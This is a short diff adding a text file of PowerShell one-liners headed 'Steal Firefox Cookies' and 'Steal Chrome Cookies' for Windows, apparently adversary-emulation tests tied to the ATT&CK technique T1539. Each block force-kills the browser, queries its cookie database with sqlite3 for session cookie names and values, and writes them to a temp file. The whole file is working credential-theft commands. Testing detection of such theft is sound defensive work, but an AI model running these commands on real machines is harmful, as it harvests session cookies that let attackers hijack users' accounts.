@@ -1,0 +1,10 @@
+Steal Firefox Cookies (Windows)
+
+stop-process -name "firefox" -force -erroraction silentlycontinue
+$CookieDBLocation = get-childitem -path "$env:appdata\Mozilla\Firefox\Profiles\*\cookies.sqlite"
+"select host, name, value, path, expiry, isSecure, isHttpOnly, sameSite from [moz_cookies];" | cmd /c sqlite3.exe "$CookieDBLocation" | out-file -filepath "$env:temp\T1539FirefoxCookies.txt"
+
+
+Steal Chrome Cookies (Windows)
+stop-process -name "chrome" -force -erroraction silentlycontinue
+"select host_key, name, encrypted_value, path, expires_utc, is_secure, is_httponly from [Cookies];" | cmd /c sqlite3.exe "$env:localappdata\Google\Chrome\User Data\Default\Network\Cookies" | out-file -filepath "$env:temp\T1539ChromeCookies.txt"
